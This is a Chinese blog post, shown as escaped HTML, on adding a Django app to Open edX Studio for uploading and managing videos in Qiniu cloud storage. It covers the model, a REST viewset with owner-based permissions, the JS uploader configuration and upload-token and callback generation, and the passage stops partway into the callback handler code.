&lt;p&gt;首先我们需要考虑一个问题，视频管理入口以什么形态集成到Open edX中合适（如何集成七牛云存储）。换个角度，Open edX有哪些拓展方式呢。毕竟我们可以把集成外部存储系统，看做一次对系统的拓展&lt;/p&gt;
&lt;p&gt;在&lt;a href="https://open.edx.org/extending-edx"&gt;Extending edX&lt;/a&gt;中，官方给出了集中常见的拓展方式。此外还有两种很典型的拓展：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对django开发者而言还可以直接侵入式拓展open edx，通过添加django app或者修改增强mvt中的任何一个环节&lt;/li&gt;
&lt;li&gt;模仿insights的做法，完全构建一个新的服务（网站），之后使用oauth2来打通用户系统&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因为我们希望将系统集成到open edx内部，所以决定采用添加django app的做法。
用户上传和管理视频资源需要UI界面，参考&lt;a href="http://edx.readthedocs.io/projects/edx-developer-guide/en/latest/user_interface_development.html#adding-a-ui-page"&gt;Adding a UI Page&lt;/a&gt;，发现侵入式地定制open edx很是繁琐，我们决定为此功能写一个独立的页面，绕开繁重的前端架构&lt;/p&gt;
&lt;h3&gt;为何不是xblock&lt;/h3&gt;
&lt;p&gt;也许许多Open edX用户会觉得为何放着xlock不用，而采用侵入性更大的django app来拓展呢。原因有二：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;视频管理是一个用户视角下，全局性的操作，应该有一个同意的资源管理入口，而不是每次需要先添加一个组件，再在组件里边管理视频，逻辑上，这样也能做出来。我们可以把xblock视为必须实例化（instance）为组件的东西&lt;/li&gt;
&lt;li&gt;我们不想放弃既有的视频组件（数据采集等强大功能）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;技术背景&lt;/h1&gt;
&lt;p&gt;关于七牛云你需要了解的知识和上传管理的逻辑，可以参考我此前的文章：&lt;a href="http://blog.just4fun.site/built-data-storage-system.html"&gt;为Open edX构建存储服务&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你想读懂接下来的源码，你需要了解django和django-restful-framework，如果只是用的话，就无所谓&lt;/p&gt;
&lt;h1&gt;just do it&lt;/h1&gt;
&lt;h2&gt;后端部分&lt;/h2&gt;
&lt;p&gt;我们直接在&lt;code&gt;/edx/app/edxapp/edx-platform/cms/djangoapps&lt;/code&gt;添加一个django app&lt;code&gt;qiniu_storage&lt;/code&gt;,形如：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;├── add_the_app.sh
├── ajax.js
├── __init__.py
├── models.py
├── permissions.py
├── readme.md
├── serializers.py
├── urls.py
├── views.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们重点介绍model和view部分，其他不赘述&lt;/p&gt;
&lt;h4&gt;models.py&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;
&lt;span class="c1"&gt;#from django.contrib.auth.models import User&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;QiniuFiles&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;course_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;blank&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;blank&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 上传用户，资源所有者&lt;/span&gt;
    &lt;span class="n"&gt;file_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;file_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;blank&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;file_size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#endUser = Column(String(100),nullable=True)&lt;/span&gt;
    &lt;span class="n"&gt;create_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DateTimeField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;u&amp;#39;创建时间&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;auto_now&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;ordering&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;create_time&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;views.py&lt;/h4&gt;
&lt;p&gt;只列出关键部分&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;qiniu_access_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;getattr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;QINIU_ACCESS_KEY&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;QiniuFilesViewSet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;viewsets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ModelViewSet&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;authentication_classes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TokenAuthentication&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SessionAuthentication&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt; 
    &lt;span class="n"&gt;serializer_class&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;QiniuFilesSerializer&lt;/span&gt;
    &lt;span class="n"&gt;permission_classes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;permissions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsAuthenticatedOrReadOnly&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;IsOwnerOrReadOnly&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_queryset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;        This view should return a list of all the purchases&lt;/span&gt;
&lt;span class="sd"&gt;        for the currently authenticated user.&lt;/span&gt;
&lt;span class="sd"&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;QiniuFiles&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#用户级别的管理权限，每个用户只能管理自己上传的文件&lt;/span&gt;
    &lt;span class="c1"&gt;# 删除功能暂不演示&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中的&lt;code&gt;IsOwnerOrReadOnly&lt;/code&gt;值得关注，校验用户与资源的关系&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;rest_framework&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;permissions&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;IsOwnerOrReadOnly&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;permissions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BasePermission&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Object-level permission to only allow owners of an object to edit it.&lt;/span&gt;
&lt;span class="sd"&gt;    Assumes the model instance has an `owner` attribute.&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;has_object_permission&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;view&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;permissions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SAFE_METHODS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;前端部分&lt;/h2&gt;
&lt;p&gt;前端部分主要参考七牛的&lt;a href="https://github.com/qiniu/js-sdk"&gt;js-sdk&lt;/a&gt;，使用了&lt;a href="https://github.com/zenorocha/clipboard.js"&gt;clipboard.js&lt;/a&gt;用于点击事件，使用了&lt;a href="https://github.com/needim/noty"&gt;noty&lt;/a&gt;用于消息提醒&lt;/p&gt;
&lt;p&gt;代码形如：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;uploader&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Qiniu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;uploader&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
        &lt;span class="nx"&gt;runtimes&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;html5,flash,html4&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;browse_button&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pickfiles&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;//是哪个可上传的元素&lt;/span&gt;
        &lt;span class="nx"&gt;container&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;container&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;drop_element&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;container&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;//是否可拖动，且是哪个元素&lt;/span&gt;
        &lt;span class="nx"&gt;max_file_size&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1000mb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
       &lt;span class="c1"&gt;// flash_swf_url: &amp;#39;bower_components/plupload/js/Moxie.swf&amp;#39;,&lt;/span&gt;
        &lt;span class="nx"&gt;dragdrop&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;chunk_size&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;4mb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="c1"&gt;//uptoken: &amp;#39;xxx&amp;#39; //测试用&lt;/span&gt;
        &lt;span class="nx"&gt;uptoken_url&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/qiniu/uptoken&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="c1"&gt;//key由后端生成，定制化的规则包含在载荷中&lt;/span&gt;
        &lt;span class="nx"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;xxx&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;//这是域名的绑定地址&lt;/span&gt;
        &lt;span class="nx"&gt;get_new_uptoken&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;unique_names&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;auto_start&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;log_level&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;上传流程涉及的代码&lt;/h3&gt;
&lt;p&gt;在七牛的上传原理中，上传需要凭证，我们来看看凭证的生成规则&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@api_view&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;make_uptoken&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;test_uptoken&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;QiniuTool&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_test_uptoken&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="c1"&gt;#跨域的问题 Access-Control-Allow-Origin&lt;/span&gt;
            &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;uptoken&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;test_uptoken&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中Qiniu类为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;QiniuTool&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="sd"&gt;        #处理七牛凭证相关的工具，生成uptoken&lt;/span&gt;
&lt;span class="sd"&gt;        存储相关的部分被抽象为rest服务&lt;/span&gt;
&lt;span class="sd"&gt;        函数只接受get和post&lt;/span&gt;
&lt;span class="sd"&gt;        &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span class="n"&gt;callback_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://studio.xxx.com/qiniu/post_from_qiniu&amp;#39;&lt;/span&gt;
        &lt;span class="c1"&gt;#http://developer.qiniu.com/article/kodo/kodo-developer/up/vars.html 所有的魔法变量&lt;/span&gt;
        &lt;span class="c1"&gt;#callback_body = &amp;#39;filename=$(fname)&amp;amp;filesize=$(fsize)&amp;amp;key=$(key)&amp;amp;mimeType=$(mimeType)&amp;amp;endUser=$(endUser)&amp;amp;etag=$(etag)&amp;#39;&lt;/span&gt;
        &lt;span class="n"&gt;access_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;getattr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;QINIU_ACCESS_KEY&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;secret_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;getattr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;QINIU_SECRET_KEY&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Auth&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;access_key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;secret_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# access_key和secret_key来自settings里&lt;/span&gt;
        &lt;span class="n"&gt;bucket_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;easy-edx&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_test_uptoken&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;callback_body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;file_name=$(fname)&amp;amp;file_size=$(fsize)&amp;amp;file_key=$(key)&amp;amp;mimeType=$(mimeType)&amp;amp;endUser=$(endUser)&amp;amp;etag=$(etag)&amp;amp;username={}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="c1"&gt;# 上传策略有许多可选的参数，方便服务于业务逻辑：参考[python-sdk](http://developer.qiniu.com/docs/v6/sdk/python-sdk.html)&lt;/span&gt;
            &lt;span class="c1"&gt;#上传文件到七牛后， 七牛将文件名和文件大小回调给业务服务器。&lt;/span&gt;
            &lt;span class="n"&gt;policy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="s1"&gt;&amp;#39;scope&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bucket_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="s1"&gt;&amp;#39;callbackUrl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;callback_url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#回调 请求方式为POST&lt;/span&gt;
                    &lt;span class="s1"&gt;&amp;#39;callbackBody&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;callback_body&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="c1"&gt;#token = q.upload_token(bucket_name,3600,policy)&lt;/span&gt;
            &lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upload_token&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bucket_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;policy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;policy&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;视频上传好之后，七牛会可以发送一个消息给服务器，我们在此存下文件信息即可&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;qiniu_files.serializers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;QiniuFilesSerializer&lt;/span&gt;

